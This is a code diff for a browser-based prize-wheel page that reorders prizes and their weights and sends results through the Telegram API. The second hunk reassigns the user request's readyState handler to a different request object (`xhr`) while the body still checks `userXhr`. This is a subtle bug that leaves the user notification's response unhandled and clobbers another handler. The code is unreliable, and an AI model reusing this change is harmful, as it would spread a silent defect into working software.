@@ -247,14 +247,23 @@
         const operator_group_id = '-1002519162293';
 
         // Set prizes and weights based on wheel_type
-        const prizes = wheelPrizes[wheel_type] || wheelPrizes['1'];
-        const weights = wheelWeights[wheel_type] || wheelWeights['1'];
+        let prizes = wheelPrizes[wheel_type] || wheelPrizes['1'];
+        let weights = wheelWeights[wheel_type] || wheelWeights['1'];
 
-        // Shifted 4 positions clockwise from [prizes[5], prizes[4], prizes[3], prizes[2], prizes[1], prizes[0], prizes[7], prizes[6]]
+        // Swap opposite prizes and weights
+        const swapIndices = [[5, 7], [4, 6], [3, 1], [2, 0]];
+        prizes = [...prizes];
+        weights = [...weights];
+        swapIndices.forEach(([i, j]) => {
+            [prizes[i], prizes[j]] = [prizes[j], prizes[i]];
+            [weights[i], weights[j]] = [weights[j], weights[i]];
+        });
+
+        // Define ordered prizes and weights
         const orderedPrizes = [prizes[1], prizes[0], prizes[7], prizes[6], prizes[5], prizes[4], prizes[3], prizes[2]];
         const orderedWeights = [weights[1], weights[0], weights[7], weights[6], weights[5], weights[4], weights[3], weights[2]];
 
-        // Text angles remain the same, tied to conic-gradient sectors
+        // Text angles tied to conic-gradient sectors
         const textAngles = [27.5, 72.5, 117.5, 162.5, 207.5, 252.5, 297.5, 342.5];
         orderedPrizes.forEach((prize, index) => {
             const span = document.createElement('span');
@@ -301,7 +310,7 @@
                             const userXhr = new XMLHttpRequest();
                             userXhr.open('POST', url, true);
                             userXhr.setRequestHeader('Content-Type', 'application/json');
-                            userXhr.onreadystatechange = function () {
+                            xhr.onreadystatechange = function () {
                                 if (userXhr.readyState === 4) {
                                     if (userXhr.status === 200) {
                                         console.log(`Attempt ${attempt}: Data sent via Telegram API to user: ${JSON.stringify(data)}`);
